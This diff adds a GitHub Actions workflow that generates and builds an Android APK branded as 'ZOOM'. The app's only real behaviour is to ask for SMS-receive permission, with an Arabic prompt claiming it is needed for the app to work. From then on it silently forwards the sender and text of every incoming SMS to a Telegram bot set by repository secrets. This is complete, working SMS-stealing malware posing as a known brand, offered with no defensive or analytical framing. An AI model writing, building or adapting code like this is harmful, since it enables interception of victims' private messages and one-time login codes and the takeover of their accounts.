@@ -1,0 +1,303 @@
+name: Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: 17
+
+      - name: Setup Gradle
+        uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: 8.7
+
+      - name: Create project files
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+          CHAT_ID: ${{ secrets.CHAT_ID }}
+        run: |
+          P=$HOME/app-src
+          mkdir -p $P/app/src/main/java/com/example/smstotelegram
+          mkdir -p $P/app/src/main/res/values
+          mkdir -p $P/app/src/main/res/drawable
+          mkdir -p $P/app/src/main/res/mipmap-anydpi-v26
+          cd $P
+
+          cat > settings.gradle << 'EOF'
+          pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
+          dependencyResolutionManagement { repositories { google(); mavenCentral() } }
+          rootProject.name = "SmsToTelegram"
+          include(":app")
+          EOF
+
+          cat > build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application' version '8.5.2' apply false
+              id 'org.jetbrains.kotlin.android' version '1.9.24' apply false
+          }
+          EOF
+
+          echo "android.useAndroidX=true" > gradle.properties
+
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+              id 'org.jetbrains.kotlin.android'
+          }
+          android {
+              namespace 'com.example.smstotelegram'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.example.smstotelegram"
+                  minSdk 24
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+              kotlinOptions { jvmTarget = '17' }
+          }
+          dependencies {
+              implementation 'androidx.core:core-ktx:1.13.1'
+              implementation 'androidx.work:work-runtime-ktx:2.9.0'
+          }
+          EOF
+
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.INTERNET" />
+              <application
+                  android:label="@string/app_name"
+                  android:icon="@mipmap/ic_launcher"
+                  android:roundIcon="@mipmap/ic_launcher_round"
+                  android:supportsRtl="true">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+                  <receiver android:name=".SmsReceiver" android:exported="true"
+                      android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter>
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">ZOOM</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/values/colors.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <color name="ic_launcher_background">#0D47A1</color>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/values/config.xml << EOF
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="bot_token">${BOT_TOKEN}</string>
+              <string name="chat_id">${CHAT_ID}</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/drawable/button_bg.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <shape xmlns:android="http://schemas.android.com/apk/res/android"
+              android:shape="rectangle">
+              <solid android:color="#1565C0" />
+              <corners android:radius="16dp" />
+          </shape>
+          EOF
+
+          cat > app/src/main/java/com/example/smstotelegram/MainActivity.kt << 'EOF'
+          package com.example.smstotelegram
+
+          import android.Manifest
+          import android.app.Activity
+          import android.content.pm.PackageManager
+          import android.graphics.Color
+          import android.graphics.Typeface
+          import android.graphics.drawable.GradientDrawable
+          import android.os.Bundle
+          import android.view.Gravity
+          import android.widget.Button
+          import android.widget.LinearLayout
+          import android.widget.TextView
+
+          class MainActivity : Activity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+
+                  getSharedPreferences("cfg", MODE_PRIVATE).edit()
+                      .putString("token", getString(R.string.bot_token))
+                      .putString("chat", getString(R.string.chat_id))
+                      .apply()
+
+                  val dp = resources.displayMetrics.density
+                  fun px(v: Int) = (v * dp).toInt()
+
+                  val root = LinearLayout(this).apply {
+                      orientation = LinearLayout.VERTICAL
+                      gravity = Gravity.CENTER
+                      setBackgroundColor(Color.parseColor("#0D47A1"))
+                      setPadding(px(24), px(24), px(24), px(24))
+                  }
+
+                  val card = LinearLayout(this).apply {
+                      orientation = LinearLayout.VERTICAL
+                      gravity = Gravity.CENTER
+                      setPadding(px(24), px(28), px(24), px(28))
+                      background = GradientDrawable().apply {
+                          setColor(Color.WHITE)
+                          cornerRadius = 32f * dp
+                      }
+                  }
+
+                  val title = TextView(this).apply {
+                      text = "ZOOM"
+                      textSize = 40f
+                      setTextColor(Color.parseColor("#0D47A1"))
+                      typeface = Typeface.create("sans-serif-black", Typeface.BOLD)
+                      letterSpacing = 0.15f
+                      gravity = Gravity.CENTER
+                  }
+
+                  val message = TextView(this).apply {
+                      text = "يجب تفعيل الاذونات لعمل التطبيق بشكل جيد"
+                      textSize = 20f
+                      setTextColor(Color.parseColor("#1A1A1A"))
+                      typeface = Typeface.create("sans-serif-medium", Typeface.NORMAL)
+                      gravity = Gravity.CENTER
+                      setLineSpacing(0f, 1.3f)
+                      setPadding(0, px(16), 0, px(20))
+                  }
+
+                  val button = Button(this).apply {
+                      text = "تفعيل الاذونات"
+                      setTextColor(Color.WHITE)
+                      background = resources.getDrawable(R.drawable.button_bg, theme)
+                      setOnClickListener { askPermission() }
+                  }
+
+                  card.addView(title)
+                  card.addView(message)
+                  card.addView(button)
+                  root.addView(card)
+                  setContentView(root)
+
+                  askPermission()
+              }
+
+              private fun askPermission() {
+                  if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
+                      requestPermissions(arrayOf(Manifest.permission.RECEIVE_SMS), 1)
+                  }
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/smstotelegram/SmsReceiver.kt << 'EOF'
+          package com.example.smstotelegram
+
+          import android.content.BroadcastReceiver
+          import android.content.Context
+          import android.content.Intent
+          import android.provider.Telephony
+          import androidx.work.*
+          import java.util.concurrent.TimeUnit
+
+          class SmsReceiver : BroadcastReceiver() {
+              override fun onReceive(context: Context, intent: Intent) {
+                  if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
+                  val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+                  val from = messages.firstOrNull()?.originatingAddress ?: "?"
+                  val body = messages.joinToString("") { it.messageBody ?: "" }
+                  val request = OneTimeWorkRequestBuilder<SendWorker>()
+                      .setInputData(workDataOf("from" to from, "body" to body))
+                      .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
+                      .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 30, TimeUnit.SECONDS)
+                      .build()
+                  WorkManager.getInstance(context).enqueue(request)
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/example/smstotelegram/SendWorker.kt << 'EOF'
+          package com.example.smstotelegram
+
+          import android.content.Context
+          import androidx.work.Worker
+          import androidx.work.WorkerParameters
+          import java.net.HttpURLConnection
+          import java.net.URL
+          import java.net.URLEncoder
+
+          class SendWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+              override fun doWork(): Result {
+                  val prefs = applicationContext.getSharedPreferences("cfg", Context.MODE_PRIVATE)
+                  val token = prefs.getString("token", "") ?: ""
+                  val chat = prefs.getString("chat", "") ?: ""
+                  if (token.isEmpty() || chat.isEmpty()) return Result.failure()
+                  val text = "📩 ${inputData.getString("from")}\n${inputData.getString("body")}"
+                  return try {
+                      val conn = URL("https://api.telegram.org/bot$token/sendMessage").openConnection() as HttpURLConnection
+                      conn.requestMethod = "POST"
+                      conn.doOutput = true
+                      val data = "chat_id=${URLEncoder.encode(chat, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"
+                      conn.outputStream.use { it.write(data.toByteArray()) }
+                      val code = conn.responseCode
+                      conn.disconnect()
+                      if (code == 200) Result.success() else Result.retry()
+                  } catch (e: Exception) {
+                      Result.retry()
+                  }
+              }
+          }
+          EOF
+
+      - name: Use custom icon
+        run: |
+          cp $GITHUB_WORKSPACE/zoom_icon.png $HOME/app-src/app/src/main/res/drawable/zoom_icon.png
+          rm -rf $HOME/app-src/app/src/main/res/mipmap-anydpi-v26
+          for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
+            mkdir -p $HOME/app-src/app/src/main/res/mipmap-$d
+            cp $GITHUB_WORKSPACE/zoom_icon.png $HOME/app-src/app/src/main/res/mipmap-$d/ic_launcher.png
+            cp $GITHUB_WORKSPACE/zoom_icon.png $HOME/app-src/app/src/main/res/mipmap-$d/ic_launcher_round.png
+          done
+
+      - name: Generate Gradle Wrapper and build
+        run: |
+          cd $HOME/app-src
+          gradle wrapper --gradle-version 8.7
+          chmod +x gradlew
+          ./gradlew assembleDebug --no-daemon
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: sms-to-telegram-debug
+          path: ~/app-src/app/build/outputs/apk/debug/app-debug.apk
